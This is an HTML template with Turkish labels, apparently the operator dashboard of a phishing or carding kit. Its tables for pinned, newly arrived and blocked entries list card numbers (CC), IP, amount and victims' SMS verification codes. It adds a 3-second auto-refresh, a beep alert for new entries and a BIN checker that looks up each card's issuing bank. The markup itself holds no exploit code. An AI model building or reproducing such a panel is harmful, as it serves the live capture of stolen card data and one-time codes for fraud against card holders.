<div class="page-body">

  <div class="container-fluid " style="padding-top:20px">
    <div class="row">

      <div class="col-xl-12 xl-100 box-col-12">
        <div class="card">
          <div class="card-body">
            <div class="card-title">
              <div class="text-center">
                <a href="javascript:;" onclick="hepsini_sil()" class="btn btn-danger btn-sm">
                  Hepsini Sil
                </a>

                <button type="button" onclick="veriler()" class="btn btn-primary btn-sm">
                  Refresh
                </button>
                <button type="button" disabled class="btn btn-primary btn-sm text-right">
                  Oto Refresh 3sn ( <span id="dongu_Say">0</span> )
                </button>

                <button type="button" onclick="beep();" id="testbeep" class="btn btn-primary btn-sm text-right">
                  BEEP AKTİFLEŞTİR
                </button>

              </div>
            </div>

            <div class="card-header text-center">
              <h5 class="text-primary">Sabitlenenler</h5>
            </div>
            <div class="table-responsive">
              <table class="table table-hover">
                <thead>
                  <tr>
                    <th style="width:1%">ID</th>
                    <th class="text-center" style="width:7%">CC</th>
                    <th style="width:5%">NO</th>
                    <th style="width:5%">IP</th>
                    <th style="width:10%">TARİH</th>
                    <th style="width:5%">DURUM</th>
                    <th style="width:5%">MİKTAR</th>
                    <th class="text-center" style="width:10%">SMS Kodu</th>
                    <th style="width:7%" class="text-center"></th>
                  </tr>
                </thead>
                <tbody id="TBSabit">

                </tbody>
              </table>
            </div>

            <div class="card-header text-center">
              <h5 class="text-info">Yeni Gelenler</h5>
            </div>
            <div class="table-responsive">
              <table class="table table-hover">
                <thead>
                  <tr>
                    <th style="width:1%">ID</th>
                    <th class="text-center" style="width:7%">CC</th>
                    <th style="width:5%">NO</th>
                    <th style="width:5%">IP</th>
                    <th style="width:10%">TARİH</th>
                    <th style="width:5%">DURUM</th>
                    <th style="width:5%">MİKTAR</th>
                    <th class="text-center" style="width:10%">SMS Kodu</th>
                    <th style="width:7%" class="text-center"></th>
                  </tr>
                </thead>
                <tbody id="TBData">

                </tbody>
              </table>
            </div>

            <div class="card-header text-center">
              <h5 class="text-danger">Engellenenler</h5>
            </div>
            <div class="table-responsive">
              <table class="table table-hover">
                <thead>
                  <tr>
                    <th style="width:1%">ID</th>
                    <th class="text-center" style="width:7%">CC</th>
                    <th style="width:5%">NO</th>
                    <th style="width:5%">IP</th>
                    <th style="width:10%">TARİH</th>
                    <th style="width:5%">DURUM</th>
                    <th style="width:5%">MİKTAR</th>
                    <th class="text-center" style="width:10%">SMS Kodu</th>
                    <th style="width:7%" class="text-center"></th>
                  </tr>
                </thead>
                <tbody id="TBBan">

                </tbody>
              </table>
            </div>

          </div>
        </div>
      </div>
    </div>
  </div>
</div>


<div class="modal fade" id="binModal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title" id="lineModalLabel">BIN CHECKER</h3>
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
      </div>
      <div class="modal-body">
        <style>
          .custab {
            border: 1px solid #ccc;
            padding: 5px;
            margin: 5% 0;
            box-shadow: 3px 3px 2px #ccc;
            transition: 0.5s;
          }

          .custab:hover {
            box-shadow: 3px 3px 0px transparent;
            transition: 0.5s;
          }

          @media (min-width: 576px) {
            .modal-dialog {
              max-width: 600px;
              margin: 1.75rem auto;
            }
          }
        </style>
        <table class="table table-striped table-responsive custab" style="width:99%">
          <thead>
            <tr>
              <th>bin</th>
              <th>ülke</th>
              <th>scheme</th>
              <th>type</th>
              <th>brand</th>
              <th>bank</th>
            </tr>
          </thead>
          <tbody id="binBody">
          <tbody>
        </table>
      </div>
    </div>
  </div>
</div>